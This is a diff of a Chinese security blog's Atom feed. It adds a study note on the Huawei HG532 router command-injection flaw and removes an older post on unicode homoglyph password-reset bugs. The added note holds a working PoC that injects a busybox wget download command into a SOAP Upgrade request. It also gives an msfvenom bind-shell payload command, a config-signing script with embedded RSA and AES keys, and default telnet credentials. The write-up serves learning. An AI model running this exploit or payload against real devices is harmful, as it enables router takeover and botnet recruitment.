@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://xdxd.love/"/>
-  <updated>2018-02-02T07:11:19.079Z</updated>
+  <updated>2018-02-10T08:18:44.892Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -14,6 +14,228 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>华为HG532远程命令执行漏洞 学习笔记</title>
+    <link href="http://xdxd.love/2018/02/10/%E5%8D%8E%E4%B8%BAHG532%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <id>http://xdxd.love/2018/02/10/华为HG532远程命令执行漏洞-学习笔记/</id>
+    <published>2018-02-10T08:15:07.000Z</published>
+    <updated>2018-02-10T08:18:44.892Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理">漏洞原理</h2><p>参考资料1Huawei HG532 系列路由器远程命令执行漏洞分析，用户输入拼接到字符串中，最后调用system执行shell命令导致命令执行。</p>
+<p><img src="/images/hg5321.png" alt=""></p>
+<h2 id="poc">poc</h2><pre><code><span class="xml">import requests
+
+headers = </span><span class="expression">{
+    <span class="string">"Authorization"</span>: <span class="string">"Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"</span>
+}</span><span class="xml">
+
+data = '''<span class="pi">&lt;?xml version="1.0" ?&gt;</span>
+ <span class="tag">&lt;<span class="title">s:Envelope</span> <span class="attribute">xmlns:s</span>=<span class="value">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attribute">s:encodingStyle</span>=<span class="value">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span>
+  <span class="tag">&lt;<span class="title">s:Body</span>&gt;</span><span class="tag">&lt;<span class="title">u:Upgrade</span> <span class="attribute">xmlns:u</span>=<span class="value">"urn:schemas-upnp-org:service:WANPPPConnection:1"</span>&gt;</span>
+   <span class="tag">&lt;<span class="title">NewStatusURL</span>&gt;</span>;/bin/busybox wget -g 192.168.1.2 -l /tmp/1 -r /1;<span class="tag">&lt;/<span class="title">NewStatusURL</span>&gt;</span>
+   <span class="tag">&lt;<span class="title">NewDownloadURL</span>&gt;</span>HUAWEIUPNP<span class="tag">&lt;/<span class="title">NewDownloadURL</span>&gt;</span>
+  <span class="tag">&lt;/<span class="title">u:Upgrade</span>&gt;</span>
+ <span class="tag">&lt;/<span class="title">s:Body</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">s:Envelope</span>&gt;</span>
+'''
+requests.post('http://192.168.1.1:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)</span>
+</code></pre><h2 id="shell获取">shell获取</h2><p>使用msfvenom生成payload。 </p>
+<pre><code><span class="comment">msfvenom</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">format</span> <span class="comment">elf</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">arch</span> <span class="comment">mipsbe</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">platform</span> <span class="comment">linux</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">payload</span> <span class="comment">linux/mipsbe/shell_bind_tcp</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">out</span> <span class="comment">payload</span><span class="string">.</span><span class="comment">elf</span> 
+</code></pre><p><img src="/images/hg5322.png" alt=""></p>
+<p>修改poc，下载payload执行可以获得shell。</p>
+<p><img src="/images/hg5323.png" alt=""></p>
+<h2 id="动态调试">动态调试</h2><p><img src="/images/hg5324.png" alt=""></p>
+<h2 id="开启telent">开启telent</h2><p>该款路由器默认不开启telent。可以通过修改配置文件的方式开启telent。先下载配置文件，配置文件是加密的。使用一下脚本解密。脚本为网上开源。</p>
+<pre><code><span class="comment">#!/usr/bin/python</span>
+<span class="keyword">import</span> sys
+<span class="keyword">import</span> os
+<span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify
+<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES
+<span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256
+<span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number
+
+
+RSA_D = <span class="string">"1B18D0048611500CA489C51D7389B19A"</span> \
+    <span class="string">"F977E6F5BB8DD5E61A62E339499E6237"</span> \
+    <span class="string">"C234740129EBD25EF226AB7E498A0830"</span> \
+    <span class="string">"DF0A5D45F19F5055B906EBC5E71C16C5"</span> \
+    <span class="string">"A99E36D4F369701FAE2403E445BA3CAE"</span> \
+    <span class="string">"4B0C9526A82EDD90FECD78B7EDD5EA5E"</span> \
+    <span class="string">"6C98A0C4CABF3148E99E78DA0D5EB972"</span> \
+    <span class="string">"6F1533A6738F47C790037D532F403C0D"</span>
+
+RSA_N = <span class="string">"A93591A1BFCB7615555C12CFE3AF0B68"</span> \
+    <span class="string">"5A6B94E8604A9441ABF7A5F268D4CBF9"</span> \
+    <span class="string">"6022E2F0694D679D2C8E4C2D4C3C0C44"</span> \
+    <span class="string">"60C5646E852A51EF7EBC2F0C88F08E80"</span> \
+    <span class="string">"6D991446348EB7AF280E607DDA363F4F"</span> \
+    <span class="string">"322E9B5005503F31F60353219F86443A"</span> \
+    <span class="string">"04E573FFEF541D21ADD1043E478D81B1"</span> \
+    <span class="string">"E79A5B434C5F64B3D5B141D7BEB59D71"</span>
+
+RSA_E = <span class="string">"010001"</span>
+
+SIG_TEMPLATE = <span class="string">"0001FFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
+               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
+               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
+               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
+               <span class="string">"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"</span> \
+               <span class="string">"003021300906052B0E03021A05000420"</span>
+
+AES128CBC_KEY = <span class="string">"3E4F5612EF64305955D543B0AE350880"</span>
+AES128CBC_IV = <span class="string">"8049E91025A6B54876C3B4868090D3FC"</span>
+
+XML_VERSION_STRING = <span class="string">b'&lt;?xml version="1.0" ?&gt;'</span>
+
+<span class="function"><span class="keyword">def</span> <span class="title">print_usage</span><span class="params">()</span>:</span>
+    print(<span class="string">"Usage : "</span> + sys.argv[<span class="number">0</span>] + <span class="string">" {encrypt | decrypt} input_file output_file"</span>)
+    sys.exit(<span class="number">1</span>)
+
+<span class="function"><span class="keyword">def</span> <span class="title">load_config</span><span class="params">(config_file)</span>:</span>
+    <span class="keyword">if</span> os.path.isfile(config_file):
+        cf = open(config_file, <span class="string">"rb"</span>)
+        config = cf.read()
+        cf.close()
+    <span class="keyword">else</span>:
+        print(<span class="string">"Config file not found..exiting"</span>)
+        sys.exit(<span class="number">1</span>)
+    <span class="keyword">return</span> config
+
+<span class="function"><span class="keyword">def</span> <span class="title">save_to_file</span><span class="params">(dest_file, data)</span>:</span>
+    wfile = open(dest_file,<span class="string">"wb"</span>)
+    wfile.write(data)
+    wfile.close()
+
+<span class="function"><span class="keyword">def</span> <span class="title">get_sha256_hash_from_sig</span><span class="params">(sig)</span>:</span>
+    sig_int = int(hexlify(sig),<span class="number">16</span>)
+    rsa_n = int(RSA_N,<span class="number">16</span>)
+    dec_sig_as_int = pow(sig_int, <span class="number">0x10001</span>, rsa_n );
+    decrypted_sig = number.long_to_bytes(dec_sig_as_int, <span class="number">128</span>)
+    target_sha256 = hexlify(decrypted_sig)[-<span class="number">64</span>:]
+    <span class="keyword">return</span> target_sha256
+
+<span class="function"><span class="keyword">def</span> <span class="title">calc_actual_sha256_hash</span><span class="params">(enc_config_body)</span>:</span>
+    sha256 = SHA256.new()
+    sha256.update(enc_config_body)
+    actual_sha256_sig = sha256.hexdigest()
+    actual_sha256_sig = str.encode(actual_sha256_sig)
+    <span class="keyword">return</span> actual_sha256_sig
+
+<span class="function"><span class="keyword">def</span> <span class="title">decrypt_body</span><span class="params">(enc_config_body)</span>:</span>
+    iv = unhexlify(AES128CBC_IV)
+    key= unhexlify(AES128CBC_KEY)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_data = cipher.decrypt(enc_config_body)
+    <span class="comment"># Strip block padding</span>
+    decrypted_data=decrypted_data.rstrip(<span class="string">b'\0'</span>)
+    <span class="keyword">return</span> decrypted_data
+
+
+<span class="function"><span class="keyword">def</span> <span class="title">decrypt_config</span><span class="params">(input_file, output_file)</span>:</span>
+    enc_config=load_config(input_file)
+    sig = enc_config[:<span class="number">0x80</span>]
+    enc_config_body=enc_config[<span class="number">0x80</span>:]
+
+    print(<span class="string">"verifying signature..."</span>)
+    target_sha256_hash = get_sha256_hash_from_sig(sig)
+    actual_sha256_hash = calc_actual_sha256_hash(enc_config_body)
+
+    <span class="keyword">if</span> (actual_sha256_hash == target_sha256_hash):
+        print(<span class="string">"Signature ok..."</span>)
+    <span class="keyword">else</span>:
+        print(<span class="string">"Signature not ok...exiting"</span>)
+        sys.exit(<span class="number">1</span>)
+
+    print(<span class="string">"Decrypting..."</span>)
+    decrypted_data = decrypt_body(enc_config_body)
+
+    <span class="comment">#check_config(decrypted_data)</span>
+
+    print(<span class="string">"Saving decrypted config to "</span> + output_file + <span class="string">"..."</span>)
+    save_to_file(output_file, decrypted_data)
+
+<span class="comment">#def check_config(new_config_file):</span>
+<span class="comment">#    head = new_config_file[0:len(XML_VERSION_STRING)]</span>
+<span class="comment">#    if head != XML_VERSION_STRING:</span>
+<span class="comment">#        print("Not a valid config file...exiting")</span>
+<span class="comment">#        sys.exit(1)</span>
+
+<span class="function"><span class="keyword">def</span> <span class="title">encrypt_config</span><span class="params">(input_file, output_file)</span>:</span>
+    new_config_file=load_config(input_file)
+
+    <span class="comment">#check_config(new_config_file)</span>
+
+    padding_amount = len(new_config_file) % <span class="number">32</span>
+    print(<span class="string">""</span> + str(padding_amount) + <span class="string">" bytes padding needed"</span>)
+    print(<span class="string">"Adding padding..."</span>)
+    new_config_file=new_config_file + <span class="string">b'\0'</span>*(<span class="number">32</span>-padding_amount)
+
+    print(<span class="string">"Encrypting config..."</span>)
+    iv = unhexlify(AES128CBC_IV)
+    key= unhexlify(AES128CBC_KEY)
+    aes = AES.new(key, AES.MODE_CBC, iv)
+    enc_new_config = aes.encrypt(new_config_file)
+
+    print(<span class="string">"Calculating SHA256 hash..."</span>)
+    h = SHA256.new()
+    h.update(enc_new_config)
+    actual_sha256_sig = h.hexdigest()
+
+    sig = SIG_TEMPLATE+actual_sha256_sig;
+
+    print(<span class="string">"Encrypting Signature..."</span>)
+    sig_int = int(sig,<span class="number">16</span>)
+    rsa_d = int(RSA_D,<span class="number">16</span>)
+    rsa_n = int(RSA_N,<span class="number">16</span>)
+    enc_sig_int = pow(sig_int, rsa_d, rsa_n);
+
+    encrypted_sig = number.long_to_bytes(enc_sig_int, <span class="number">128</span>)
+    enc_config = encrypted_sig + enc_new_config
+
+    print(<span class="string">"Saving encrypted config to "</span> + output_file + <span class="string">"..."</span>)
+    save_to_file(output_file, enc_config)
+
+<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>
+
+    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">4</span>:
+        print_usage()
+
+    input_file = sys.argv[<span class="number">2</span>]
+    output_file = sys.argv[<span class="number">3</span>]
+    command = sys.argv[<span class="number">1</span>]
+
+    <span class="keyword">if</span> (command == <span class="string">"encrypt"</span>):
+        encrypt_config(input_file, output_file)
+    <span class="keyword">elif</span> (command == <span class="string">"decrypt"</span>):
+        decrypt_config(input_file, output_file)
+    <span class="keyword">else</span>:
+        print_usage()
+
+
+
+<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
+    main()
+</code></pre><p>修改配置文件之后，可能还需要修改防火墙策略，才可以连上telnet端口。</p>
+<p>telnet的用户名和密码为：!!Huawei          @HuaweiHgw<br>连上之后为一个自定义的shell，无法执行正常的shell命令。网上查到输入 welcome to shell可以获得正常shell。但是输入之后无任何信息返回，虽然没有获得shell，但是跟其他命令还是有区别。其他字符会返回command failed。<br><img src="/images/hg5325.png" alt=""></p>
+<h2 id="修复方案">修复方案</h2><p>其他华为官网上的新版本固件就不存在这个漏洞了。应该是重构了，大部分逻辑都改了。所以这个漏洞其实是不影响最新版的固件的。只是一个比较老的版本存在的问题。</p>
+<p><img src="/images/hg5326.png" alt=""></p>
+<h2 id="其他分析资料学习与反思">其他分析资料学习与反思</h2><p><a href="http://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/" target="_blank" rel="external">对华为HG532远程命令执行漏洞的新探索</a>中有两个新的点，一个是利用csrf实现漏洞利用。将用户名和密码放在url中完成认证，http:// dslf-config:admin @routerip:37215。这个方式在之前13年传播比较广的利用csrf修改dns的利用中就是这么实现的。再一个是利用DNS rebind技术绕过限制，获得自己需要的一些http header。</p>
+<p><a href="https://slab.qq.com/news/tech/1705.html" target="_blank" rel="external">腾讯蜜罐系统捕获高危IoT蠕虫Okiru</a> 文中也有对该漏洞的简要分析。文中提到利用0x22字符，试图对认证字符进行截断。我觉得这个推测应该是不正确，后文也并没有其他的依据可以证明这个推断。0x22就是http协议需要和xml协议中需要的双引号。没有绕过认证的作用。<br><img src="/images/hg5327.png" alt=""></p>
+<h2 id="参考资料">参考资料</h2><p><a href="https://paper.seebug.org/490/" target="_blank" rel="external">https://paper.seebug.org/490/</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;漏洞原理&quot;&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;参考资料1Huawei HG532 系列路由器远程命令执行漏洞分析，用户输入拼接到字符串中，最后调用system执行shell命令导致命令执行。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hg5321.png&quot; alt=
+    
+    </summary>
+    
+      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>安全圈怪现状读后感</title>
@@ -1410,53 +1632,6 @@ header(<span class="string">"Location: gopher://127.0.0.1:6379/_*1<span class="v
     </summary>
     
       <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>unicode同形字引起的安全问题</title>
-    <link href="http://xdxd.love/2016/10/17/unicode%E5%90%8C%E5%BD%A2%E5%AD%97%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
-    <id>http://xdxd.love/2016/10/17/unicode同形字引起的安全问题/</id>
-    <published>2016-10-17T00:25:08.000Z</published>
-    <updated>2016-10-19T05:42:32.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="历史上的安全漏洞">历史上的安全漏洞</h1><h2 id="spotify的漏洞">spotify的漏洞</h2><p><a href="https://labs.spotify.com/2013/06/18/creative-usernames/" target="_blank" rel="external">spotify任意用户密码修改漏洞</a><br>漏洞简介:<br>找一个需要黑掉的账号，比如以bigbird为例。创建一个账户名为 ᴮᴵᴳᴮᴵᴿᴰ (in python this is the string u’\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30′)。然后申请修改忘记密码，修改自己申请的账号密码。修改之后以刚刚设置的密码登录bigbird。就可以成功登录。<br>spotify的漏洞相比于github的漏洞来说是一个真正的高危漏洞，可以修改任意用户的密码。</p>
-<h2 id="github的漏洞">github的漏洞</h2><p>相关资料：</p>
-<p><a href="https://twitter.com/GitHubSecurity/status/757686530748125184" target="_blank" rel="external">https://twitter.com/GitHubSecurity/status/757686530748125184</a><br><a href="https://bounty.github.com/researchers/jagracey.html?ljh" target="_blank" rel="external">https://bounty.github.com/researchers/jagracey.html?ljh</a></p>
-<p>漏洞简介：<br>github的邮箱名允许unicode字符，导致可以把找回密码的token发送到攻击者的邮箱。假设有 mike@example.org vs mıke@example.org 两个邮箱。重置mıke@example.org用户的密码。github在处理邮箱名字的时候，会把mıke@example.org标准化成mike@example.org，从而把mike@example.org用户的密码重置token发送到了mıke@example.org的邮箱。</p>
-<p>从twitter的讨论来以及自己的测试结果来看提供邮箱服务的产品大部分都是白名单了邮箱的用户名，所以都是不可以使用unicode字符的。测试了网易的企业邮箱和腾讯的企业邮箱，都不可以使用unicode字符。所以只能自己搭一个邮件服务器来测试这个问题。</p>
-<h1 id="魔法在哪里">魔法在哪里</h1><h2 id="编码的基础知识、unicode编码和同形字">编码的基础知识、unicode编码和同形字</h2><p>参考资料：<br><a href="http://www.freebuf.com/articles/web/25623.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/25623.html</a><br><a href="http://www.irongeek.com/homoglyph-attack-generator.php" target="_blank" rel="external">http://www.irongeek.com/homoglyph-attack-generator.php</a></p>
-<p>了解了编码是二进制和字符之间的映射关系之后，可以了解到unicode字符无非也是一种字符而已，只要程序支持，应该不会有任何问题。为什么这个unicode字符在处理过程中变成了另外一个字符，而且是看起来很相似的字符，难道程序也跟人眼看一样，被相同的外表迷惑了。显然程序处理的是二进制的数据，只要二进制不同，无论外表看起来多么一样，程序都应该可以分辨出来。关于unicode同形字的问题，unicode homoglyphs，其实早就有不少讨论。不过大多是利用同形字来迷惑人钓鱼之类。那么机器怎么也会被同形字迷惑呢。</p>
-<p>github的漏洞描述中是这么写的:a flaw in the way email addresses were being normalized to standard character sets when used to look up accounts during the password recovery flow. 在邮件地址标准化成标准的字符集的时候出现问题。</p>
-<p>而spoity中对有对详细漏洞的代码分析：可以看到也是对字符串的标准化操作导致unicode字符转换成了与他同形的ascii字符。</p>
-<h2 id="unicode转ascii">unicode转ascii</h2><p>参考资料：<br><a href="https://www.peterbe.com/plog/unicode-to-ascii" target="_blank" rel="external">https://www.peterbe.com/plog/unicode-to-ascii</a><br><a href="http://savanttools.com/unicode-to-ascii.asp" target="_blank" rel="external">http://savanttools.com/unicode-to-ascii.asp</a></p>
-<p>这里才是最有意思的地方，为什么对unicode字符的标准化会导致unicode转变成了对应的同形字。电脑应该是只看二进制，又不是跟人一样，会被同形的字迷惑。通过搜索发现，原来有专门的unicode转ascii函数，对unicode于同形的ascii之间有对应的map。</p>
-<p>比如github中提到的例子，转成对应的ascii就刚好对的上。<br><img src="/images/unicodesec1.png" alt="image"></p>
-<h1 id="漏洞原理">漏洞原理</h1><p>漏洞的原理比较有意思，主要的条件是用户的id支持unicode。比如两个ID：mike@example.org vs mıke@example.org<br>然而在一些业务逻辑中会对用户id做标准化的操作，比如重置密码的时候，mıke@example.org标准化之后变成了mike@example.org，从而重置了mike@example.org的密码。</p>
-<p>所以关键的条件就是用户识别的ID(包括可以用来登录的邮箱)支持unicode。而在某些业务逻辑中有对unicode字符进行所谓标准化，转换成了对应的ascii。其实假如某些业务逻辑不支持unicode，直接丢掉了那部分unicode，应该也是一样的，目前没有看到类似的案例。导致在这部分业务逻辑中出现了越权的问题。典型的场景就是修改密码，导致可以修改他人的密码。</p>
-<h1 id="对微信的测试记录">对微信的测试记录</h1><p>实际中的场景比较少，大部分产品都会对用户登录名做白名单限制了。经过一番寻找发现微信的绑定邮箱是支持unicode的，而且是邮箱的用户名和域名部分都支持unicode。当然最后的测试结果是不存在这个漏洞。作为一个典型的测试过程记录一下。</p>
-<h2 id="搭建支持unicode用户名的邮件服务器">搭建支持unicode用户名的邮件服务器</h2><p>使用iredmail方便快速搭建邮件服务器。然后发现iredmail对用户名也是有过滤的。代码在iRedAdmin-0.6.1/libs/iredutils.py 中的is_email方法。修改该方法直接返回True,不检查邮件用户名。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">######################&#10;# Regular expressions.&#10;#&#10;# Email.&#10;reEmail = r&#39;&#39;&#39;[\w\-][\w\-\.\+\=]*@[\w\-][\w\-\.]*\.[a-zA-Z0-9\-]&#123;2,15&#125;&#39;&#39;&#39;&#10;&#10;# Domain.&#10;reDomain = r&#39;&#39;&#39;[\w\-][\w\-\.]*\.[a-z0-9\-]&#123;2,15&#125;&#39;&#39;&#39;&#10;&#10;# End Regular expressions.&#10;####&#10;&#10;#####################################&#10;# Pre-defined values of SQL functions.&#10;sqlUnixTimestamp = web.sqlliteral(&#39;UNIX_TIMESTAMP()&#39;)&#10;&#10;#####&#10;&#10;##############&#10;# Validators&#10;#&#10;INVALID_EMAIL_CHARS = &#39;~!#$%^&#38;*()\\/\ &#39;&#10;INVALID_DOMAIN_CHARS = &#39;~!#$%^&#38;*()+\\/\ &#39;&#10;&#10;&#10;def is_email(s):&#10;    #return True &#30452;&#25509;&#36820;&#22238;true&#65292;&#19981;&#26816;&#26597;email&#21517;&#31216;&#21512;&#27861;&#24615;&#12290;&#10;    s = str(s)&#10;    if len(set(s) &#38; set(INVALID_EMAIL_CHARS)) &#62; 0 \&#10;       or &#39;.&#39; not in s \&#10;       or s.count(&#39;@&#39;) != 1:&#10;        return False&#10;&#10;    reCompEmail = re.compile(reEmail + &#39;$&#39;, re.IGNORECASE)&#10;    if reCompEmail.match(s):&#10;        return True&#10;    else:&#10;        return False</span><br></pre></td></tr></table></figure>
-<p><img src="/images/unicodesec2.png" alt="image"></p>
-<p>然后发现依然无法收到邮件，发现服务器返回505。拒绝了含有unicode字符的邮箱。</p>
-<p><img src="/images/unicodesec3.png" alt="image"></p>
-<p>采用的解决方式在数据库中插入了一条域名的邮箱，转发到一个正常的邮箱。这样可以接受这个域名所有的邮件。</p>
-<p><img src="/images/unicode4.png" alt="image"></p>
-<p>因为iredmail默认开启了SSL，为了调试，查看具体的smtp信息，关闭了SSL，直接明文传。</p>
-<h2 id="绑定邮箱以及重置密码">绑定邮箱以及重置密码</h2><p>微信邮箱绑定支持unicode字符的邮箱。<br><img src="/images/unicodesec5.png" alt="image"></p>
-<p>绑定邮箱后，重置密码。</p>
-<p><img src="/images/unicodesec6.png" alt="image"> </p>
-<p>正常重置了自己的密码。链接中的email字段是base64编码的。解码出来是含有unicode字符的邮箱。所以微信的重置密码业务逻辑中没有标准化unicode字符这个处理。不存在unicode同形字引起的漏洞。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;历史上的安全漏洞&quot;&gt;历史上的安全漏洞&lt;/h1&gt;&lt;h2 id=&quot;spotify的漏洞&quot;&gt;spotify的漏洞&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.spotify.com/2013/06/18/creative-usernames/&quot; targe
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
     
   </entry>
